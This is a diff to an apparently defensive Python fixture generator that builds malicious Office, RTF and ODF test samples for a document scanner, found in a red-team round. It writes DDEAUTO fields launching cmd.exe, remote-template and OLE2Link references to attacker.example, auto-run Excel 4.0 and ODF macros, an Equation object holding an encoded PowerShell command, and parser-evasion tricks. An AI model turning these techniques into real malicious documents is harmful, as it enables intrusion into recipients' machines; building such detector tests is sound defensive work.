@@ -910,6 +910,104 @@ def main() -> None:
                                                                     + wide("http://attacker.example/x.hta"), "\\objemb")))
     write(R / "office_rt_ole2link_flags_wide.rtf", rtf(rtf_object("Foo.Bar", wide("http://attacker.example/x.hta"), "\\objautlink\\objupdate")))
 
+    # ── found by the second red-team round ─────────────────────────────────────
+    # A name can start with any Unicode letter, and an XML name may hold U+00B7: a tokenizer that insists
+    # on [A-Za-z_] never sees the element.
+    write(R / "office_rt2_unicode_prefix_dde.docx", docx(doc_xml=CT_HEAD + f'<é:document xmlns:é="{wml}"><é:body>' + dde_run.format(p="é") + "</é:body></é:document>"))
+    write(R / "office_rt2_unicode_prefix_rels.docx", docx(extra={
+        "word/settings.xml": settings_part,
+        "word/_rels/settings.xml.rels": (CT_HEAD + f'<a·b:Relationships xmlns:a·b="{prel}"><a·b:Relationship Id="rId1" '
+                                         f'Type="{REL}/attachedTemplate" Target="http://attacker.example/evil.dotm" TargetMode="External"/></a·b:Relationships>').encode()}))
+    # Character references in attribute values are decoded by every parser: TargetMode="Ext&#101;rnal" is External.
+    write(R / "office_rt2_cref_targetmode.docx", docx(extra={
+        "word/settings.xml": settings_part,
+        "word/_rels/settings.xml.rels": (CT_HEAD + f'<Relationships xmlns="{prel}"><Relationship Id="rId1" Type="{REL}/attachedTemplate" '
+                                         'Target="http://attacker.example/evil.dotm" TargetMode="Ext&#101;rnal"/></Relationships>').encode()}))
+    write(R / "office_rt2_cref_fldchar.docx", docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body><w:p><w:r><w:fldChar w:fldCharType="b&#101;gin"/></w:r>'
+        '<w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r>'
+        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>'))
+    write(R / "office_rt2_cref_hidden.xlsm", xlsx(
+        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" state="&#104;idden" r:id="rId2"/>',
+        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", False)],
+        extra={"xl/macrosheets/sheet1.xml": (CT_HEAD + f'<worksheet xmlns="{smlns}"><sheetData><row r="1"><c r="A1"><f>HALT()</f></c></row></sheetData></worksheet>').encode()},
+        content_extra='<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
+        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
+    # Field syntax: a switch may come before the file name, and LINK takes a class name first.
+    def field_doc(instr: str) -> bytes:
+        return docx(f'<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> {instr} </w:instrText></w:r>'
+                    '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
+    write(R / "office_rt2_include_switch.docx", field_doc('INCLUDEPICTURE \\d "\\\\\\\\attacker.example\\\\share\\\\logo.png"'))
+    write(R / "office_rt2_link_class.docx", field_doc('LINK Excel.Sheet.8 "\\\\\\\\attacker.example\\\\share\\\\book.xls" "Sheet1!R1C1:R2C2" \\a \\p'))
+    write(R / "office_rt2_include_local.docx", field_doc('INCLUDEPICTURE \\d "images\\\\logo.png" \\* MERGEFORMAT'))
+    # ODF: the mimetype entry anywhere in the archive (or absent, with a manifest), and the events LibreOffice 24.2
+    # really fires while a document opens.
+    odf_macro_doc = lambda event: odf(
+        scripts='<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" '
+                f'script:event-name="{event}" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/>'
+                "</office:event-listeners></office:scripts>",
+        extra=basic_module("Module1", 'Sub Main\n  MsgBox "hello"\nEnd Sub\n'))
+    def reorder(data: bytes, last: str | None = None, drop: str | None = None) -> bytes:
+        with zipfile.ZipFile(io.BytesIO(data)) as z:
+            items = [(i.filename, z.read(i.filename)) for i in z.infolist() if i.filename != drop]
+        if last:
+            items = [x for x in items if x[0] != last] + [x for x in items if x[0] == last]
+        return zbytes(items)
+    base_odt = odf_macro_doc("office:load")
+    write(R / "office_rt2_odf_mimetype_late.odt", reorder(base_odt, last="mimetype"))
+    write(R / "office_rt2_odf_no_mimetype.odt", reorder(base_odt, drop="mimetype"))
+    for nm, ev in (("domfocusin", "dom:DOMFocusIn"), ("layout_finished", "office:layout-finished"), ("page_count_change", "office:page-count-change")):
+        write(R / f"office_rt2_odf_{nm}.odt", odf_macro_doc(ev))
+    write(R / "office_rt2_odf_modify_changed.odt", odf_macro_doc("office:modify-changed"))
+    # Legacy: a visible Excel 4.0 macro sheet whose strings hold an auto-run name and a command line; an Equation
+    # object recognised by its CLSID with the payload in a differently named stream; a URL moniker in a padded stream.
+    def bof():
+        return struct.pack("<HHHHHHII", 0x0809, 16, 0x600, 0x5, 0x1CE8, 0x07CC, 0, 6)
+
+    def boundsheet(name, hidden, kind):
+        nm = name.encode("latin-1")
+        return struct.pack("<HHIBB", 0x0085, 8 + len(nm), 0, hidden, kind) + struct.pack("<BB", len(nm), 0) + nm
+
+    def xls_book(extra_text: bytes) -> bytes:
+        return (bof() + boundsheet("Sheet1", 0, 0) + boundsheet("Macro1", 0, 1) + struct.pack("<HH", 0x0018, len(extra_text)) + extra_text
+                + struct.pack("<HH", 0x000A, 0))
+    write(R / "office_rt2_xlm_auto_close.xls", cfb({"Workbook": xls_book(b"Auto_Close\x00cmd.exe /c calc.exe\x00")}))
+    write(R / "office_rt2_xlm_visible_quiet.xls", cfb({"Workbook": xls_book(b"Total\x00Subtotal\x00")}))
+    write(R / "office_rt2_equation_renamed_stream.doc", cfb(
+        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
+         "ObjectPool": {"_1": {"Equation Native2": b"\x1c\x00\x00\x00\x02\x00\x01\x02\x03\x04" + b"cmd.exe /c powershell -enc AAAA" + b"\x00" * 40,
+                               "\x01CompObj": b"Microsoft Equation 3.0\x00"}}},
+        clsids={("ObjectPool", "_1"): EQUATION_CLSID}))
+    write(R / "office_rt2_ole_moniker_padded.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
+        "ObjectPool": {"_1": {"\x01Ole": moniker_stream("http://attacker.example/x.hta") + b"\x00" * 70000, "\x01CompObj": b"\x01\x00\xfe\xff" + b"OLE2Link\x00" * 2}}}))
+    # RTF: a control word that does nothing, a hex escape inside the keyword, an INCLUDEPICTURE field, and a raw byte
+    # carried by \bin (a '}' among them is data, not the end of the group).
+    fld = lambda instr: "{\\field{\\*\\fldinst " + instr + '}{\\fldrslt x}}'
+    write(R / "office_rt2_rtf_dde_additive.rtf", rtf(fld('\\additive DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"')))
+    write(R / "office_rt2_rtf_dde_hexescape.rtf", rtf(fld('\\\'44DEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"')))
+    write(R / "office_rt2_rtf_template_additive.rtf", rtf("{\\*\\template \\additive http://attacker.example/evil.dotm}\\pard Hello\\par"))
+    write(R / "office_rt2_rtf_includepicture.rtf", rtf(fld('INCLUDEPICTURE \\\\d "\\\\\\\\\\\\\\\\attacker.example\\\\\\\\share\\\\\\\\logo.png"')))
+    def rtf_object_bin(classname: str, payload: bytes, raw_at: int, flags: str = "\\objemb") -> str:
+        data = ole1_object(classname, payload)
+        idx = len(data) - len(payload) + raw_at
+        assert data[idx:idx + 1] in (b"}", b"{", b"\\")
+        return ("{\\object" + flags + "{\\*\\objclass " + classname + "}{\\*\\objdata " + data[:idx].hex()
+                + "\\bin1 " + data[idx:idx + 1].decode("latin-1") + data[idx + 1:].hex() + "}}")
+    write(R / "office_rt2_rtf_bin_brace_equation.rtf", rtf(rtf_object_bin("Equation.3", b"}" + b"cmd /c calc.exe " + b"A" * 60, 0)))
+    # An OLE Package whose first byte (the low byte of the stream's length) is 0x7D, so a raw '}' is natural data.
+    pad = 0
+    while (len(ole10native("invoice.exe", pe() + b"\x00" * pad)) - 4) & 0xFF != 0x7D:
+        pad += 1
+    write(R / "office_rt2_rtf_bin_brace_pe.rtf", rtf(rtf_object_bin("Package", ole10native("invoice.exe", pe() + b"\x00" * pad), 0)))
+    link_bin = bytearray(link_cfb("http://attacker.example/x.hta")); link_bin[0x34] = 0x7D
+    write(R / "office_rt2_rtf_bin_brace_ole2link.rtf", rtf(rtf_object_bin("OLE2Link", bytes(link_bin), 0x34, "\\objautlink\\objupdate\\rsltpict")))
+    # An RTF is an RTF whatever the file is called; Flat OPC is read from a .xml.
+    dde_rtf = rtf(fld('DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"'))
+    write(R / "office_rt2_rtf_renamed.txt", dde_rtf)
+    write(R / "office_rt2_rtf_renamed.log", dde_rtf)
+    write(R / "office_rt2_rtf_noext", dde_rtf)
+    write(R / "office_rt2_flat_opc.xml", flat(flat_parts))
+    write(R / "office_rt2_plain_notes.txt", b"Meeting notes.\nThe RTF format is described in the specification.\n")
+
     # ── legacy binary (OLE2) ────────────────────────────────────────────────
     write(R / "office_legacy_macro.doc", cfb({
         "WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60, "1Table": b"\x00" * 64,
